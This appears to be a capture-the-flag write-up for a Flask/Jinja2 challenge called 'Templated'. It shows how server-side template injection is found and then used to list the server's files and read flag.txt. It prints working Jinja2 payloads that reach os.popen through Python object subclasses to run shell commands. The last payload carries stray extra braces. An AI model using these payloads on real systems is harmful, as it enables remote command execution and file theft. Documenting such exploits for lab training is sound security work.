# Templated
![Screenshot from 2021-08-04 16-05-21](https://user-images.githubusercontent.com/87865134/128154165-59273d02-11ef-4eeb-b8b6-7dc8b90a0436.png)

> web use Flask/Jinja2

## - Test Server-side template injection
  `/{{7*7}}`  
 ![Screenshot from 2021-08-04 16-07-33](https://user-images.githubusercontent.com/87865134/128154512-c6e25556-d0fd-43fd-bc2f-7de838220637.png)
  
 > found template injection

## - Exploit
### 1. List all objects
```python
/{{().__class__.__bases__[0].__subclasses__()}}
```
![Screenshot from 2021-08-04 16-09-44](https://user-images.githubusercontent.com/87865134/128154925-b4f456e1-da1f-4b3a-989c-5a11c5fc0640.png)

### 2. List files in current directory
```python
/{{().__class__.__bases__[0].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}
```
> found flag.txt

### 3. Read file ***flag.txt*** to get flag
```python
/{{().__class__.__bases__[0].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}}}
```
![Screenshot from 2021-08-04 16-16-48](https://user-images.githubusercontent.com/87865134/128155852-b8bfca9c-55f7-4e2a-a4db-8b79a7012a1f.png)

## - Description
> **category:** Server-side Template Injection
